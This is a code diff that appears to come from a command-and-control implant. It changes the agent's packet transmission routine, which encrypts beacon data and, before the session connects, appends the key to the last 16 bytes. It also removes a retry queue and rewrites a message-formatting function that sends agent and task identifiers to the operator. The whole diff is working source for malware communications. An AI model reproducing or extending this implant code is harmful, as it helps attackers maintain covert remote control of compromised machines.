@@ -678,7 +678,7 @@ auto DECLFN Package::Transmit(
     PVOID  RetBuffer     = nullptr;
     UINT64 Retsize       = 0;
 
-    ULONG EncryptOffset  = 36;
+    ULONG EncryptOffset  = 36; // agent_id size
     ULONG PlainLen       = Package->Length - EncryptOffset;
     ULONG PaddedLen      = Self->Crp->CalcPadding( PlainLen );
     ULONG TotalPacketLen = EncryptOffset + PaddedLen;
@@ -689,15 +689,18 @@ auto DECLFN Package::Transmit(
     Package->Buffer = KhReAlloc( Package->Buffer, TotalPacketLen );
     Package->Length = TotalPacketLen;
 
+    // prepare for pack encrypted buffer
     PBYTE EncBuffer = (PBYTE)Self->Mm->Alloc( nullptr, TotalPacketLen, MEM_COMMIT, PAGE_READWRITE );
     if ( ! EncBuffer ) return FALSE;
 
     Mem::Copy( EncBuffer, Package->Buffer, EncryptOffset );
     Mem::Copy( EncBuffer + EncryptOffset, B_PTR( Package->Buffer ) + EncryptOffset, PlainLen );
 
+    // encrypt it
     Self->Crp->AddPadding( EncBuffer + EncryptOffset, PlainLen, PaddedLen );
     Self->Crp->Encrypt( EncBuffer + EncryptOffset, PaddedLen );
 
+    // if not connected, send the encryption key into 16 final bytes
     if ( ! Self->Session.Connected ) {
         if ( TotalPacketLen < sizeof( Self->Crp->LokKey ) ) {
             Self->Mm->Free( EncBuffer, 0, MEM_RELEASE );
@@ -710,21 +713,14 @@ auto DECLFN Package::Transmit(
         );
     }
 
-    this->FlushQueue();
-
     SendData.Ptr  = (PBYTE)EncBuffer;
     SendData.Size = TotalPacketLen;
 
     if ( Self->Tsp->Send( &SendData, &RecvData ) ) {
         Success = TRUE;
-    } else {
-        this->Enqueue( EncBuffer, TotalPacketLen );
-        EncBuffer = nullptr;
     }
 
-    if ( EncBuffer ) {
-        Self->Mm->Free( EncBuffer, TotalPacketLen, MEM_RELEASE );
-    }
+    Self->Mm->Free( EncBuffer, TotalPacketLen, MEM_RELEASE );
     
     if ( Success && RecvData.Ptr && RecvData.Size ) {
         UCHAR* DecryptBuff   = RecvData.Ptr + EncryptOffset;
@@ -748,69 +744,6 @@ auto DECLFN Package::Transmit(
     }
 
     return Success;
-}
-
-auto DECLFN Package::Enqueue(
-    _In_ PVOID Buffer,
-    _In_ ULONG Length
-) -> VOID {
-    TRANSPORT_NODE* Node = (TRANSPORT_NODE*)KhAlloc( sizeof(TRANSPORT_NODE) );
-    if ( ! Node ) return;
-
-    Node->Buffer = KhAlloc( Length );
-    if ( ! Node->Buffer ) {
-        KhFree( Node );
-        return;
-    }
-
-    Mem::Copy( Node->Buffer, Buffer, Length );
-    Node->Length = Length;
-    Node->Next   = nullptr;
-
-    if ( ! this->QueueHead ) {
-        this->QueueHead = Node;
-    } else {
-        TRANSPORT_NODE* Cur = this->QueueHead;
-        while ( Cur->Next ) {
-            Cur = (TRANSPORT_NODE*)Cur->Next;
-        }
-        Cur->Next = (TRANSPORT_NODE*)Node;
-    }
-
-    this->QueueCount++;
-    KhDbg("Packet queued - Count: %d, Size: %d", this->QueueCount, Length);
-}
-
-auto DECLFN Package::FlushQueue( VOID ) -> VOID {
-    TRANSPORT_NODE* Cur  = this->QueueHead;
-    TRANSPORT_NODE* Prev = nullptr;
-
-    while ( Cur ) {
-        TRANSPORT_NODE* Next = (TRANSPORT_NODE*)Cur->Next;
-
-        MM_INFO SendData = { 0 };
-        SendData.Ptr  = (PBYTE)Cur->Buffer;
-        SendData.Size = Cur->Length;
-
-        if ( Self->Tsp->Send( &SendData, nullptr ) ) {
-            KhDbg("Queued packet sent - Size: %d", Cur->Length);
-
-            if ( Prev ) {
-                Prev->Next = Cur->Next;
-            } else {
-                this->QueueHead = (TRANSPORT_NODE*)Cur->Next;
-            }
-
-            KhFree( Cur->Buffer );
-            KhFree( Cur );
-            this->QueueCount--;
-
-            Cur = (TRANSPORT_NODE*)( Prev ? Prev->Next : (TRANSPORT_NODE*)this->QueueHead );
-        } else {
-            KhDbg("Queued packet retry failed - stopping flush");
-            break;
-        }
-    }
 }
 
 auto DECLFN Package::Byte( 
@@ -902,50 +835,73 @@ auto DECLFN Package::SendOut(
 auto DECLFN Package::FmtMsg(
     _In_ ULONG Type,
     _In_ CHAR* Message,
-    ...    
-) -> BOOL {
-    va_list VaList = { 0 };
-    va_start( VaList, Message );
+    ...
+) -> BOOL
+{
+    BOOL    result  = FALSE;
+    ULONG   MsgSize = 0;
+    CHAR*   MsgBuff = nullptr;
+    PACKAGE* Package = nullptr;
 
-    BOOL  result   = 0;
-    ULONG MsgSize  = 0;
-    CHAR* MsgBuff  = nullptr;
-    
-    PACKAGE* Package = (PACKAGE*)KhAlloc( sizeof( PACKAGE ) );
+    va_list VaList;
+    va_start(VaList, Message);
 
-    MsgSize = Self->Msvcrt.vsnprintf( nullptr, 0, Message, VaList );
-    if ( MsgSize < 0 ) {
-        KhDbg( "failed get the formated message size" ); goto _KH_END;
+    va_list VaListCopy;
+    va_copy(VaListCopy, VaList);
+
+    MsgSize = Self->Msvcrt.vsnprintf(nullptr, 0, Message, VaList);
+    va_end(VaList);
+
+    if (MsgSize <= 0) {
+        KhDbg("failed to get formatted message size");
+        goto _KH_END;
     }
 
-    MsgBuff = (CHAR*)KhAlloc( MsgSize +1 );
-
-    if ( Self->Msvcrt.vsnprintf( MsgBuff, MsgSize, Message, VaList ) < 0 ) {
-        KhDbg( "failed formating string" ); goto _KH_END;
+    MsgBuff = (CHAR*)KhAlloc(MsgSize + 1);
+    if (!MsgBuff) {
+        KhDbg("failed to allocate message buffer");
+        goto _KH_END;
     }
 
-    Package->Buffer = PTR( KhAlloc( sizeof( BYTE ) ) );
+    if (Self->Msvcrt.vsnprintf(MsgBuff, MsgSize + 1, Message, VaListCopy) < 0) {
+        KhDbg("failed formatting string");
+        goto _KH_END;
+    }
+
+    va_end(VaListCopy);
+
+    Package = (PACKAGE*)KhAlloc(sizeof(PACKAGE));
+    if (!Package) {
+        KhDbg("failed to allocate package");
+        goto _KH_END;
+    }
+
+    Package->Buffer = PTR(KhAlloc(sizeof(BYTE)));
     Package->Length = 0;
 
-    this->Pad( Package, (PUCHAR)Self->Session.AgentID, 36 );
-    this->Byte( Package, (BYTE)Action::Task::QuickMsg );
+    this->Pad(Package, (PUCHAR)Self->Session.AgentID, 36);
+    this->Byte(Package, (BYTE)Action::Task::QuickMsg);
 
-    if ( PROFILE_C2 == PROFILE_SMB ) {
-        // this->Pad( Package, (PUCHAR)SmbUUID, 36 );
+    if (PROFILE_C2 == PROFILE_SMB) {
+        // this->Pad(Package, (PUCHAR)SmbUUID, 36);
     }
 
-    this->Pad( Package, (UCHAR*)Self->Jbs->CurrentUUID, 36 );
-    this->Int32( Package, Type );
-    this->Str( Package, Message );
+    this->Pad(Package, (PUCHAR)Self->Jbs->CurrentUUID, 36);
+    this->Int32(Package, Type);
 
-    result = this->Transmit( Package, nullptr, 0 );
+    this->Str(Package, MsgBuff);
+
+    result = this->Transmit(Package, nullptr, 0);
 
 _KH_END:
-    if ( Package ) this->Destroy( Package );
-    if ( VaList  ) va_end( VaList );
-    if ( MsgBuff ) KhFree( MsgBuff );
 
-    return result;   
+    if (Package)
+        this->Destroy(Package);
+
+    if (MsgBuff)
+        KhFree(MsgBuff);
+
+    return result;
 }
 
 auto DECLFN Package::SendMsgA(
